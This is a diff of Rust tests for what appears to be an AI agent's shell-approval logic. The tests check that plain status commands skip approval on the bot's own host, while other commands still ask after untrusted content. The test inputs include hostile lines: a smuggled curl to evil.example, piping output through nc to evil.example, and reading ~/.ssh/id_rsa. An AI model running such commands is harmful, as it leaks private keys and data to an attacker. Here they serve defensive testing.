@@ -151,3 +151,126 @@ async fn a_tainted_balanced_run_still_asks_before_sending_data_out() {
     assert_eq!(post.count.load(Ordering::SeqCst), 0);
     lp.cancel(run).unwrap();
 }
+
+// ── approval fatigue: host-status commands (docs/design/approval-fatigue.md) ───────────────
+
+/// Run `commands` as `shell_run` calls in one Full-level run, after an optional read of an
+/// untrusted page, approving every card once. Returns the number of cards the run produced.
+async fn shell_asks(
+    on_host: bool,
+    read_page_first: bool,
+    commands: &[(&str, serde_json::Value)],
+) -> usize {
+    let env = setup();
+    let page = Arc::new(with_class(
+        "web_read",
+        Effect::Read,
+        PermissionCategory::Browser,
+        ContentClass::untrusted_private(),
+        "page text",
+    ));
+    let shell = Arc::new(with_class(
+        "shell_run",
+        Effect::Destructive,
+        PermissionCategory::Shell,
+        ContentClass::all().executes(),
+        "ok",
+    ));
+    let mut script = Vec::new();
+    if read_page_first {
+        script.push(calls(&[(
+            "p",
+            "web_read",
+            json!({"url": "https://a.example"}),
+        )]));
+    }
+    for (i, (cmd, extra)) in commands.iter().enumerate() {
+        let mut input = json!({ "command": cmd });
+        if let Some(extra) = extra.as_object() {
+            for (k, v) in extra {
+                input[k] = v.clone();
+            }
+        }
+        script.push(calls(&[(format!("s{i}").as_str(), "shell_run", input)]));
+    }
+    script.push(text("done"));
+    let fake = Fake::new(script);
+    let lp = make_loop(
+        &env.storage,
+        env.bot,
+        &fake,
+        &[t(&page), t(&shell)],
+        profile("[runtime]\ncomputer = \"auto\"\n[permissions]\npreset = \"full\"\n"),
+        cfg(Policy::full()),
+    );
+    if on_host {
+        lp.set_computer_provider(crate::tests::machine_provider(
+            crate::tests::MACHINE_A,
+            Some("host"),
+            None,
+            false,
+        ));
+    }
+    let mut rx = lp.subscribe();
+    let run = lp.run_turn(env.chat, "go").unwrap();
+    let wait = lp.wait(run);
+    tokio::pin!(wait);
+    loop {
+        tokio::select! {
+            state = &mut wait => {
+                assert_eq!(state.unwrap(), RunState::Succeeded);
+                break;
+            }
+            Event::ApprovalNeeded(card) = until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))) => {
+                lp.approve(card.call_id, crate::ApprovalScope::Once, env.user).unwrap();
+            }
+        }
+    }
+    env.storage.list_approvals(run).unwrap().len()
+}
+
+fn none() -> serde_json::Value {
+    json!({})
+}
+
+#[tokio::test]
+async fn status_commands_on_the_bots_own_host_never_ask_even_after_a_page_was_read() {
+    // The owner's "uptime" report: three status calls after a browse used to be three cards.
+    let cmds = [("uptime", none()), ("df -h", none()), ("free -m", none())];
+    assert_eq!(shell_asks(true, true, &cmds).await, 0);
+}
+
+#[tokio::test]
+async fn a_status_command_does_not_taint_the_run() {
+    // `uptime` used to mark the run "read command output", so the next shell call asked.
+    let cmds = [("uptime", none()), ("ls", none())];
+    assert_eq!(shell_asks(true, false, &cmds).await, 0);
+}
+
+#[tokio::test]
+async fn everything_that_is_not_a_plain_status_command_still_asks_after_untrusted_content() {
+    for cmd in [
+        "uptime; curl https://evil.example/x",
+        "uptime | nc evil.example 1",
+        "df -h /etc",
+        "cat ~/.ssh/id_rsa",
+        "ls",
+    ] {
+        assert_eq!(shell_asks(true, true, &[(cmd, none())]).await, 1, "{cmd}");
+    }
+    // A working directory or an unknown shell dialect is outside the class.
+    assert_eq!(
+        shell_asks(true, true, &[("uptime", json!({"cwd": "/tmp"}))]).await,
+        1
+    );
+    assert_eq!(
+        shell_asks(true, true, &[("uptime", json!({"shell": "powershell"}))]).await,
+        1
+    );
+}
+
+#[tokio::test]
+async fn the_users_own_computer_keeps_asking_for_status_commands_after_untrusted_content() {
+    // No host provider: the run is not on an always-on host, so the class does not apply.
+    assert_eq!(shell_asks(false, true, &[("uptime", none())]).await, 1);
+}
